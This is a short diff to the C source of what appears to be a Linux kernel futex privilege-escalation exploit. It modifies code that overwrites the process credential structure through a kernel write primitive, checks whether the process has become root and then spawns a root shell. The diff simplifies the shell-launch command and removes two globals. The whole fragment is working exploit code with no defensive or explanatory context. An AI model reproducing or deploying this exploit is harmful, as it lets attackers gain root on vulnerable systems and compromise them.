@@ -35,8 +35,6 @@
 futex_t destfutex = 0;
 futex_t srcfutex = 0;
 int proceed_to_overwrite = 0;
-int close_thread = 0;
-struct rb_node *waiter_ptr;
 unsigned long tbase;
 
 #define KERNABLE 0xa0000000
@@ -139,7 +137,7 @@ void *ger(void *arg){
 	write_kern((void *)(cred+24), (void*)&new_egideuid, 4);
 
 	if(geteuid() != 0) printf("not root :(\n");
-	sprintf(buf,"sh -c \"echo success %d > offset.txt && chmod 777 offset.txt && sh \"",WAITER_OVERWRITE_OFFSET);
+	sprintf(buf,"sh",WAITER_OVERWRITE_OFFSET);
 	system(buf);
 	
 	printf("ger function exiting. your OS will lose it like Brazil\n");
